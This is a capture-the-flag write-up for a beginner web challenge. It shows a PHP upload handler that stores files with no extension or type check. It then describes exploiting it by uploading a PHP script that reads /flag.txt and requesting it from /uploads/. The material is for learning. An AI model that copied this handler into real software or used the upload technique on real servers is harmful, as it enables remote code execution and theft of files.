# Write-up of the challenge "image-storage"

This challenge is part of the "Web" category and is level 1.

## Program structure (only upload.php)

```
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];

      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <form enctype='multipart/form-data' method="POST">
        <div class="form-group">
          <label for="InputFile">파일 업로드</label>
          <input type="file" id="InputFile" name="file">
        </div>
        <input type="submit" class="btn btn-default" value="Upload">
      </form>
    </div>
</body>
</html>

```

## Vulnerability

Not doing any input sanitization leaving the risk for **RCE**.

```
$directory = './uploads/';
$file = $_FILES["file"];
$error = $file["error"];
$name = $file["name"];
$tmp_name = $file["tmp_name"];
```

## Solution

So what I did was write a basic **PHP script**, that reads and output the content of the file **flag.txt**:

```
<?php
$file = fopen("/flag.txt", "r");
if ($file) {
    echo fread($file, filesize("/flag.txt"));
    fclose($file);
} else {
    echo "Failed";
}
?>
```

Later I just went to **/upload.php** and selected the my PHP script which I named **solve.php**. It told me to go to:

```
/uploads/solve.php
```

and when I want there the flag was in plain sight.
